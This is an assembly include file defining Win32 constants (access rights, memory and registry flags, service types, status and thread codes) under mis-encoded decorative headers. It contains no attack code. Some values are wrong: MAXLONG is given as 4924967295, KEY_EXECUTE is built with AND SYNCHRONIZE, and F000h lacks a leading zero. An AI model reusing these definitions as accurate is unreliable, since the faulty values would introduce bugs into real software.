¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ

        $

;ÕÕÕÕÕÕµ EQUATES ∆ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕ

;ƒƒƒƒƒƒ¥ GENERAL √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 UCHAR         EQU   <db>
 USHORT        EQU   <dw>
 UINT          EQU   <dd>
 ULONG         EQU   <dd>
 L             EQU   <LARGE>

 MAXCHAR       EQU   255
 MAXSHORT      EQU   32767
 MAXINT        EQU   2147483647
 MAXLONG       EQU   4924967295

 NULL          EQU   00h
 TRUE          EQU   01h
 FALSE         EQU   00h
 NOPARITY      EQU   00h
 ODDPARITY     EQU   01h
 EVENPARITY    EQU   02h
 MARKPARITY    EQU   03h
 SPACEPARITY   EQU   04h
 IGNORE        EQU   00h
 INFINITE      EQU   0FFFFFFFFh

;ƒƒƒƒƒƒ¥ DRIVES √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 DRIVE_UNKNOWN               EQU 0
 DRIVE_NO_ROOT_DIR           EQU 1
 DRIVE_REMOVABLE             EQU 2
 DRIVE_FIXED                 EQU 3
 DRIVE_REMOTE                EQU 4
 DRIVE_CDROM                 EQU 5
 DRIVE_RAMDISK               EQU 6

;ƒƒƒƒƒƒ¥ DIFFERENT RIGHTS √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 DELETE                      EQU   00010000h
 READ_CONTROL                EQU   00020000h
 WRITE_DAC                   EQU   00040000h
 WRITE_OWNER                 EQU   00080000h
 SYNCHRONIZE                 EQU   00100000h
 STANDARD_RIGHTS_REQUIRED    EQU   000F0000h
 STANDARD_RIGHTS_READ        EQU   READ_CONTROL
 STANDARD_RIGHTS_WRITE       EQU   READ_CONTROL
 STANDARD_RIGHTS_EXECUTE     EQU   READ_CONTROL
 STANDARD_RIGHTS_ALL         EQU   001F0000h
 SPECIFIC_RIGHTS_ALL         EQU   0000FFFFh
 ACCESS_SYSTEM_SECURITY      EQU   01000000h
 MAXIMUM_ALLOWED             EQU   02000000h

 GENERIC_READ                EQU   80000000h
 GENERIC_WRITE               EQU   40000000h
 GENERIC_EXECUTE             EQU   20000000h
 GENERIC_ALL                 EQU   10000000h

 PROCESS_TERMINATE           EQU   0001h
 PROCESS_CREATE_THREAD       EQU   0002h
 PROCESS_SET_SESSIONID       EQU   0004h
 PROCESS_VM_OPERATION        EQU   0008h
 PROCESS_VM_READ             EQU   0010h
 PROCESS_VM_WRITE            EQU   0020h
 PROCESS_DUP_HANDLE          EQU   0040h
 PROCESS_CREATE_PROCESS      EQU   0080h
 PROCESS_SET_QUOTA           EQU   0100h
 PROCESS_SET_INFORMATION     EQU   0200h
 PROCESS_QUERY_INFORMATION   EQU   0400h
 PROCESS_ALL_ACCESS          EQU   STANDARD_RIGHTS_REQUIRED OR \
                                   SYNCHRONIZE OR 0FFFh

 SECTION_QUERY               EQU 0001h
 SECTION_MAP_WRITE           EQU 0002h
 SECTION_MAP_READ            EQU 0004h
 SECTION_MAP_EXECUTE         EQU 0008h
 SECTION_EXTEND_SIZE         EQU 0010h
 SECTION_ALL_ACCESS          EQU STANDARD_RIGHTS_REQUIRED OR \
                                 SECTION_QUERY            OR \
                                 SECTION_MAP_WRITE        OR \
                                 SECTION_MAP_READ         OR \
                                 SECTION_MAP_EXECUTE      OR \
                                 SECTION_EXTEND_SIZE

;ƒƒƒƒƒƒ¥ ACCESS FLAGS √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 PAGE_NOACCESS               EQU 01h
 PAGE_READONLY               EQU 02h
 PAGE_READWRITE              EQU 04h
 PAGE_WRITECOPY              EQU 08h
 PAGE_EXECUTE                EQU 10h
 PAGE_EXECUTE_READ           EQU 20h
 PAGE_EXECUTE_READWRITE      EQU 40h
 PAGE_EXECUTE_WRITECOPY      EQU 80h
 PAGE_GUARD                  EQU 100h
 PAGE_NOCACHE                EQU 200h
 PAGE_WRITECOMBINE           EQU 400h
 MEM_COMMIT                  EQU 1000h
 MEM_RESERVE                 EQU 2000h
 MEM_DECOMMIT                EQU 4000h
 MEM_RELEASE                 EQU 8000h
 MEM_FREE                    EQU 10000h
 MEM_PRIVATE                 EQU 20000h
 MEM_MAPPED                  EQU 40000h
 MEM_RESET                   EQU 80000h
 MEM_TOP_DOWN                EQU 100000h
 MEM_WRITE_WATCH             EQU 200000h
 MEM_4MB_PAGES               EQU 80000000h
 SEC_FILE                    EQU 00800000h
 SEC_IMAGE                   EQU 01000000h
 SEC_VLM                     EQU 02000000h
 SEC_RESERVE                 EQU 04000000h
 SEC_COMMIT                  EQU 08000000h
 SEC_NOCACHE                 EQU 10000000h
 MEM_IMAGE                   EQU SEC_IMAGE


;ƒƒƒƒƒƒ¥ CONTEXT √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 CONTEXT_i386                EQU 00010000h
 CONTEXT_i486                EQU 00010000h

 CONTEXT_CONTROL             EQU  CONTEXT_i386 OR 00000001h
 CONTEXT_INTEGER             EQU  CONTEXT_i386 OR 00000002h
 CONTEXT_SEGMENTS            EQU  CONTEXT_i386 OR 00000004h
 CONTEXT_FLOATING_POINT      EQU  CONTEXT_i386 OR 00000008h
 CONTEXT_DEBUG_REGISTERS     EQU  CONTEXT_i386 OR 00000010h
 CONTEXT_EXTENDED_REGISTERS  EQU  CONTEXT_i386 OR 00000020h
 CONTEXT_FULL                EQU  CONTEXT_CONTROL OR CONTEXT_INTEGER OR \
                                  CONTEXT_SEGMENTS

;ƒƒƒƒƒƒ¥ SEF √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 SEF_DACL_AUTO_INHERIT              EQU 01h
 SEF_SACL_AUTO_INHERIT              EQU 02h
 SEF_DEFAULT_DESCRIPTOR_FOR_OBJECT  EQU 04h
 SEF_AVOID_PRIVILEGE_CHECK          EQU 08h
 SEF_AVOID_OWNER_CHECK              EQU 10h
 SEF_DEFAULT_OWNER_FROM_PARENT      EQU 20h
 SEF_DEFAULT_GROUP_FROM_PARENT      EQU 40h
 WT_EXECUTEDEFAULT                  EQU 00000000h
 WT_EXECUTEINIOTHREAD               EQU 00000001h
 WT_EXECUTEINUITHREAD               EQU 00000002h
 WT_EXECUTEINWAITTHREAD             EQU 00000004h
 WT_EXECUTEDELETEWAIT               EQU 00000008h
 WT_EXECUTEINLONGTHREAD             EQU 00000010h

;ƒƒƒƒƒƒ¥ DLL √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 DLL_PROCESS_ATTACH                 EQU 1
 DLL_THREAD_ATTACH                  EQU 2
 DLL_THREAD_DETACH                  EQU 3
 DLL_PROCESS_DETACH                 EQU 0

 DONT_RESOLVE_DLL_REFERENCES        EQU 00000001h
 LOAD_LIBRARY_AS_DATAFILE           EQU 00000002h
 LOAD_WITH_ALTERED_SEARCH_PATH      EQU 00000008h

 DDD_RAW_TARGET_PATH                EQU 00000001h
 DDD_REMOVE_DEFINITION              EQU 00000002h
 DDD_EXACT_MATCH_ON_REMOVE          EQU 00000004h
 DDD_NO_BROADCAST_SYSTEM            EQU 00000008h

;ƒƒƒƒƒƒ¥ TERMINATION √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 TC_NORMAL                          EQU 0
 TC_HARDERR                         EQU 1
 TC_GP_TRAP                         EQU 2
 TC_SIGNAL                          EQU 3

;ƒƒƒƒƒƒ¥ EVENTS √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 EVENTLOG_SEQUENTIAL_READ           EQU 0001h
 EVENTLOG_SEEK_READ                 EQU 0002h
 EVENTLOG_FORWARDS_READ             EQU 0004h
 EVENTLOG_BACKWARDS_READ            EQU 0008h

 EVENTLOG_SUCCESS                   EQU 0000h
 EVENTLOG_ERROR_TYPE                EQU 0001h
 EVENTLOG_WARNING_TYPE              EQU 0002h
 EVENTLOG_INFORMATION_TYPE          EQU 0004h
 EVENTLOG_AUDIT_SUCCESS             EQU 0008h
 EVENTLOG_AUDIT_FAILURE             EQU 0010h

 EVENTLOG_START_PAIRED_EVENT        EQU 0001h
 EVENTLOG_END_PAIRED_EVENT          EQU 0002h
 EVENTLOG_END_ALL_PAIRED_EVENTS     EQU 0004h
 EVENTLOG_PAIRED_EVENT_ACTIVE       EQU 0008h
 EVENTLOG_PAIRED_EVENT_INACTIVE     EQU 0010h

;ƒƒƒƒƒƒ¥ DEBUG EVENTS √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 EXCEPTION_DEBUG_EVENT              EQU 1
 CREATE_THREAD_DEBUG_EVENT          EQU 2
 CREATE_PROCESS_DEBUG_EVENT         EQU 3
 EXIT_THREAD_DEBUG_EVENT            EQU 4
 EXIT_PROCESS_DEBUG_EVENT           EQU 5
 LOAD_DLL_DEBUG_EVENT               EQU 6
 UNLOAD_DLL_DEBUG_EVENT             EQU 7
 OUTPUT_DEBUG_STRING_EVENT          EQU 8
 RIP_EVENT                          EQU 9

;ƒƒƒƒƒƒ¥ DEBUG √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 DBG_CONTINUE                       EQU 00010002h
 DBG_TERMINATE_THREAD               EQU 40010003h
 DBG_TERMINATE_PROCESS              EQU 40010004h
 DBG_CONTROL_C                      EQU 40010005h
 DBG_CONTROL_BREAK                  EQU 40010008h
 DBG_EXCEPTION_NOT_HANDLED          EQU 80010001h

;ƒƒƒƒƒƒ¥ REGISTRY √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

; Used when accessing the Windows Registry

 HKEY_CLASSES_ROOT       EQU 80000000h
 HKEY_CURRENT_USER       EQU 80000001h
 HKEY_LOCAL_MACHINE      EQU 80000002h
 HKEY_USERS              EQU 80000003h
 HKEY_PERFORMANCE_DATA   EQU 80000004h
 HKEY_CURRENT_CONFIG     EQU 80000005h
 HKEY_DYN_DATA           EQU 80000006h

 KEY_QUERY_VALUE         EQU 0001h
 KEY_SET_VALUE           EQU 0002h
 KEY_CREATE_SUB_KEY      EQU 0004h
 KEY_ENUMERATE_SUB_KEYS  EQU 0008h
 KEY_NOTIFY              EQU 0010h
 KEY_CREATE_LINK         EQU 0020h

 KEY_READ                EQU (STANDARD_RIGHTS_READ       OR\
                              KEY_QUERY_VALUE            OR\
                              KEY_ENUMERATE_SUB_KEYS     OR\
                              KEY_NOTIFY)               AND\
                              (NOT SYNCHRONIZE)

 KEY_WRITE               EQU (STANDARD_RIGHTS_WRITE      OR\
                              KEY_SET_VALUE              OR\
                              KEY_CREATE_SUB_KEY)       AND\
                              (NOT SYNCHRONIZE)

 KEY_EXECUTE             EQU KEY_READ AND SYNCHRONIZE

 KEY_ALL_ACCESS          EQU (STANDARD_RIGHTS_ALL        OR\
                              KEY_QUERY_VALUE            OR\
                              KEY_SET_VALUE              OR\
                              KEY_CREATE_SUB_KEY         OR\
                              KEY_ENUMERATE_SUB_KEYS     OR\
                              KEY_NOTIFY                 OR\
                              KEY_CREATE_LINK)          AND\
                              (NOT SYNCHRONIZE)


 REG_OPTION_NON_VOLATILE   EQU  00000000h   ; Key is preserved when system is rebooted
 REG_OPTION_VOLATILE       EQU  00000001h   ; Key is not preserved when system is rebooted
 REG_OPTION_CREATE_LINK    EQU  00000002h   ; Created key is a symbolic link
 REG_OPTION_BACKUP_RESTORE EQU  00000004h   ; open for backup or restore special access rules privilege required
 REG_OPTION_OPEN_LINK      EQU  00000008h   ; Open symbolic link
 REG_OPTION_RESERVED       EQU  00000000h   ;
 REG_LEGAL_OPTION          EQU  REG_OPTION_RESERVED            OR\
                                REG_OPTION_NON_VOLATILE        OR\
                                REG_OPTION_VOLATILE            OR\
                                REG_OPTION_CREATE_LINK         OR\
                                REG_OPTION_BACKUP_RESTORE      OR\
                                REG_OPTION_OPEN_LINK

 REG_CREATED_NEW_KEY          EQU    00000001h   ; New Registry Key created
 REG_OPENED_EXISTING_KEY      EQU    00000002h   ; Existing Key opened
 REG_WHOLE_HIVE_VOLATILE      EQU    00000001h   ; Restore whole hive volatile
 REG_REFRESH_HIVE             EQU    00000002h   ; Unwind changes to last flush
 REG_NO_LAZY_FLUSH            EQU    00000004h   ; Never lazy flush this hive
 REG_NOTIFY_CHANGE_NAME       EQU    00000001h   ; Create or delete (child)
 REG_NOTIFY_CHANGE_ATTRIBUTES EQU    00000002h   ;
 REG_NOTIFY_CHANGE_LAST_SET   EQU    00000004h   ; time stamp
 REG_NOTIFY_CHANGE_SECURITY   EQU    00000008h   ;
 REG_LEGAL_CHANGE_FILTER      EQU    REG_NOTIFY_CHANGE_NAME          OR\
                                     REG_NOTIFY_CHANGE_ATTRIBUTES    OR\
                                     REG_NOTIFY_CHANGE_LAST_SET      OR\
                                     REG_NOTIFY_CHANGE_SECURITY

 REG_NONE                       EQU  0    ; No value type
 REG_SZ                         EQU  1    ; Unicode nul terminated string
 REG_EXPAND_SZ                  EQU  2    ; Unicode nul terminated string
 REG_BINARY                     EQU  3    ; Free form binary
 REG_DWORD                      EQU  4    ; 32-bit number
 REG_DWORD_LITTLE_ENDIAN        EQU  4    ; 32-bit number (same as REG_DWORD)
 REG_DWORD_BIG_ENDIAN           EQU  5    ; 32-bit number
 REG_LINK                       EQU  6    ; Symbolic Link (unicode)
 REG_MULTI_SZ                   EQU  7    ; Multiple Unicode strings
 REG_RESOURCE_LIST              EQU  8    ; Resource list in the resource map
 REG_FULL_RESOURCE_DESCRIPTOR   EQU  9    ; Resource list in the hardware description
 REG_RESOURCE_REQUIREMENTS_LIST EQU 10    ;

;ƒƒƒƒƒƒ¥ SERVICES √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 SERVICE_KERNEL_DRIVER        EQU   00000001h
 SERVICE_FILE_SYSTEM_DRIVER   EQU   00000002h
 SERVICE_ADAPTER              EQU   00000004h
 SERVICE_RECOGNIZER_DRIVER    EQU   00000008h
 SERVICE_DRIVER               EQU   SERVICE_KERNEL_DRIVER      OR\
                                    SERVICE_FILE_SYSTEM_DRIVER OR\
                                    SERVICE_RECOGNIZER_DRIVER

 SERVICE_WIN32_OWN_PROCESS    EQU   00000010h
 SERVICE_WIN32_SHARE_PROCESS  EQU   00000020h
 SERVICE_WIN32                EQU   SERVICE_WIN32_OWN_PROCESS  OR\
                                    SERVICE_WIN32_SHARE_PROCESS

 SERVICE_INTERACTIVE_PROCESS  EQU   00000100h

 SERVICE_TYPE_ALL             EQU   SERVICE_WIN32              OR \
                                    SERVICE_ADAPTER            OR \
                                    SERVICE_DRIVER             OR \
                                    SERVICE_INTERACTIVE_PROCESS

 SERVICE_BOOT_START           EQU   00000000h
 SERVICE_SYSTEM_START         EQU   00000001h
 SERVICE_AUTO_START           EQU   00000002h
 SERVICE_DEMAND_START         EQU   00000003h
 SERVICE_DISABLED             EQU   00000004h

 SERVICE_ERROR_IGNORE         EQU   00000000h
 SERVICE_ERROR_NORMAL         EQU   00000001h
 SERVICE_ERROR_SEVERE         EQU   00000002h
 SERVICE_ERROR_CRITICAL       EQU   00000003h

;ƒƒƒƒƒƒ¥ WAIT √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 WAIT_FAILED         EQU 0FFFFFFFFh
 WAIT_OBJECT_0       EQU STATUS_WAIT_0
 WAIT_ABANDONED      EQU STATUS_ABANDONED_WAIT_0
 WAIT_ABANDONED_0    EQU STATUS_ABANDONED_WAIT_0
 WAIT_IO_COMPLETION  EQU STATUS_USER_APC
 STILL_ACTIVE        EQU STATUS_PENDING
 CONTROL_C_EXIT      EQU STATUS_CONTROL_C_EXIT
 PROGRESS_CONTINUE   EQU 0
 PROGRESS_CANCEL     EQU 1
 PROGRESS_STOP       EQU 2
 PROGRESS_QUIET      EQU 3
 CALLBACK_CHUNK_FINISHED  EQU        00000000h
 CALLBACK_STREAM_SWITCH   EQU        00000001h

;ƒƒƒƒƒƒ¥ PIPES √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 PIPE_ACCESS_INBOUND      EQU    00000001h
 PIPE_ACCESS_OUTBOUND     EQU    00000002h
 PIPE_ACCESS_DUPLEX       EQU    00000003h
 PIPE_CLIENT_END          EQU    00000000h
 PIPE_SERVER_END          EQU    00000001h
 PIPE_WAIT                EQU    00000000h
 PIPE_NOWAIT              EQU    00000001h
 PIPE_READMODE_BYTE       EQU    00000000h
 PIPE_READMODE_MESSAGE    EQU    00000002h
 PIPE_TYPE_BYTE           EQU    00000000h
 PIPE_TYPE_MESSAGE        EQU    00000004h
 PIPE_UNLIMITED_INSTANCES EQU    255

;ƒƒƒƒƒƒ¥ SECURITY √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 SECURITY_CONTEXT_TRACKING  EQU 00040000h
 SECURITY_EFFECTIVE_ONLY    EQU 00080000h
 SECURITY_SQOS_PRESENT      EQU 00100000h
 SECURITY_VALID_SQOS_FLAGS  EQU 001F0000h

;ƒƒƒƒƒƒ¥ HEAP √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 HEAP_NO_SERIALIZE               EQU 00000001h
 HEAP_GROWABLE                   EQU 00000002h
 HEAP_GENERATE_EXCEPTIONS        EQU 00000004h
 HEAP_ZERO_MEMORY                EQU 00000008h
 HEAP_REALLOC_IN_PLACE_ONLY      EQU 00000010h
 HEAP_TAIL_CHECKING_ENABLED      EQU 00000020h
 HEAP_FREE_CHECKING_ENABLED      EQU 00000040h
 HEAP_DISABLE_COALESCE_ON_FREE   EQU 00000080h
 HEAP_CREATE_ALIGN_16            EQU 00010000h
 HEAP_CREATE_ENABLE_TRACING      EQU 00020000h
 HEAP_MAXIMUM_TAG                EQU 0FFFh
 HEAP_PSEUDO_TAG_FLAG            EQU 8000h
 HEAP_TAG_SHIFT                  EQU 18h

;ƒƒƒƒƒƒ¥ UNICODE √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 IS_TEXT_UNICODE_ASCII16             EQU   0001h
 IS_TEXT_UNICODE_REVERSE_ASCII16     EQU   0010h
 IS_TEXT_UNICODE_STATISTICS          EQU   0002h
 IS_TEXT_UNICODE_REVERSE_STATISTICS  EQU   0020h
 IS_TEXT_UNICODE_CONTROLS            EQU   0004h
 IS_TEXT_UNICODE_REVERSE_CONTROLS    EQU   0040h
 IS_TEXT_UNICODE_SIGNATURE           EQU   0008h
 IS_TEXT_UNICODE_REVERSE_SIGNATURE   EQU   0080h
 IS_TEXT_UNICODE_ILLEGAL_CHARS       EQU   0100h
 IS_TEXT_UNICODE_ODD_LENGTH          EQU   0200h
 IS_TEXT_UNICODE_DBCS_LEADBYTE       EQU   0400h
 IS_TEXT_UNICODE_NULL_BYTES          EQU   1000h
 IS_TEXT_UNICODE_UNICODE_MASK        EQU   000Fh
 IS_TEXT_UNICODE_REVERSE_MASK        EQU   00F0h
 IS_TEXT_UNICODE_NOT_UNICODE_MASK    EQU   0F00h
 IS_TEXT_UNICODE_NOT_ASCII_MASK      EQU   F000h

;ƒƒƒƒƒƒ¥ COMPRESSION √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 COMPRESSION_FORMAT_NONE         EQU  0000h
 COMPRESSION_FORMAT_DEFAULT      EQU  0001h
 COMPRESSION_FORMAT_LZNT1        EQU  0002h
 COMPRESSION_ENGINE_STANDARD     EQU  0000h
 COMPRESSION_ENGINE_MAXIMUM      EQU  0100h

;ƒƒƒƒƒƒ¥ MAXIMUMS √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 MAXLOGICALLOGNAMESIZE           EQU 256
 MAXIMUM_SUPPORTED_EXTENSION     EQU 512
 MAXIMUM_WAIT_OBJECTS            EQU 64
 MAXIMUM_SUSPEND_COUNT           EQU MAXCHAR
 MAXIMUM_PROCESSORS              EQU 32
 SIZE_OF_80387_REGISTERS         EQU 80
 MAX_PATH                        EQU 260

;ƒƒƒƒƒƒ¥ STATUS √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 STATUS_WAIT_0                    EQU 000000000h
 STATUS_ABANDONED_WAIT_0          EQU 000000080h
 STATUS_USER_APC                  EQU 0000000C0h
 STATUS_TIMEOUT                   EQU 000000102h
 STATUS_PENDING                   EQU 000000103h
 STATUS_SEGMENT_NOTIFICATION      EQU 040000005h
 STATUS_GUARD_PAGE_VIOLATION      EQU 080000001h
 STATUS_DATATYPE_MISALIGNMENT     EQU 080000002h
 STATUS_BREAKPOINT                EQU 080000003h
 STATUS_SINGLE_STEP               EQU 080000004h
 STATUS_ACCESS_VIOLATION          EQU 0C0000005h
 STATUS_IN_PAGE_ERROR             EQU 0C0000006h
 STATUS_INVALID_HANDLE            EQU 0C0000008h
 STATUS_NO_MEMORY                 EQU 0C0000017h
 STATUS_ILLEGAL_INSTRUCTION       EQU 0C000001Dh
 STATUS_NONCONTINUABLE_EXCEPTION  EQU 0C0000025h
 STATUS_INVALID_DISPOSITION       EQU 0C0000026h
 STATUS_ARRAY_BOUNDS_EXCEEDED     EQU 0C000008Ch
 STATUS_FLOAT_DENORMAL_OPERAND    EQU 0C000008Dh
 STATUS_FLOAT_DIVIDE_BY_ZERO      EQU 0C000008Eh
 STATUS_FLOAT_INEXACT_RESULT      EQU 0C000008Fh
 STATUS_FLOAT_INVALID_OPERATION   EQU 0C0000090h
 STATUS_FLOAT_OVERFLOW            EQU 0C0000091h
 STATUS_FLOAT_STACK_CHECK         EQU 0C0000092h
 STATUS_FLOAT_UNDERFLOW           EQU 0C0000093h
 STATUS_INTEGER_DIVIDE_BY_ZERO    EQU 0C0000094h
 STATUS_INTEGER_OVERFLOW          EQU 0C0000095h
 STATUS_PRIVILEGED_INSTRUCTION    EQU 0C0000096h
 STATUS_STACK_OVERFLOW            EQU 0C00000FDh
 STATUS_CONTROL_C_EXIT            EQU 0C000013Ah
 STATUS_FLOAT_MULTIPLE_FAULTS     EQU 0C00002B4h
 STATUS_FLOAT_MULTIPLE_TRAPS      EQU 0C00002B5h
 STATUS_ILLEGAL_VLM_REFERENCE     EQU 0C00002C0h
 STATUS_REG_NAT_CONSUMPTION       EQU 0C00002C9h

;ƒƒƒƒƒƒ¥ THREADS √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 THREAD_TERMINATE               EQU 0001h
 THREAD_SUSPEND_RESUME          EQU 0002h
 THREAD_GET_CONTEXT             EQU 0008h
 THREAD_SET_CONTEXT             EQU 0010h
 THREAD_SET_INFORMATION         EQU 0020h
 THREAD_QUERY_INFORMATION       EQU 0040h
 THREAD_SET_THREAD_TOKEN        EQU 0080h
 THREAD_IMPERSONATE             EQU 0100h
 THREAD_DIRECT_IMPERSONATION    EQU 0200h
 THREAD_ALL_ACCESS              EQU STANDARD_RIGHTS_REQUIRED OR\
                                SYNCHRONIZE OR 3FFh

 THREAD_BASE_PRIORITY_LOWRT  EQU 15  ; value that gets a thread to LowRealtime-1
 THREAD_BASE_PRIORITY_MAX    EQU 2   ; maximum thread base priority boost
 THREAD_BASE_PRIORITY_MIN    EQU -2  ; minimum thread base priority boost
 THREAD_BASE_PRIORITY_IDLE   EQU -15 ; value that gets a thread to idle

 THREAD_PRIORITY_LOWEST          EQU THREAD_BASE_PRIORITY_MIN
 THREAD_PRIORITY_BELOW_NORMAL    EQU THREAD_PRIORITY_LOWEST+1
 THREAD_PRIORITY_NORMAL          EQU 0
 THREAD_PRIORITY_HIGHEST         EQU THREAD_BASE_PRIORITY_MAX
 THREAD_PRIORITY_ABOVE_NORMAL    EQU THREAD_PRIORITY_HIGHEST-1
 THREAD_PRIORITY_ERROR_RETURN    EQU MAXLONG

 THREAD_PRIORITY_TIME_CRITICAL   EQU THREAD_BASE_PRIORITY_LOWRT
 THREAD_PRIORITY_IDLE            EQU THREAD_BASE_PRIORITY_IDLE


;ƒƒƒƒƒƒ¥ EVENT, MUTEX, SEMAPHORE √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 EVENT_MODIFY_STATE      EQU 0002h
 EVENT_ALL_ACCESS        EQU STANDARD_RIGHTS_REQUIRED OR SYNCHRONIZE OR 3

 MUTANT_QUERY_STATE      EQU 0001h
 MUTANT_ALL_ACCESS       EQU STANDARD_RIGHTS_REQUIRED OR SYNCHRONIZE OR\
                             MUTANT_QUERY_STATE

 SEMAPHORE_MODIFY_STATE  EQU 0002h
 SEMAPHORE_ALL_ACCESS    EQU STANDARD_RIGHTS_REQUIRED OR SYNCHRONIZE OR 3

 MUTEX_MODIFY_STATE      EQU MUTANT_QUERY_STATE
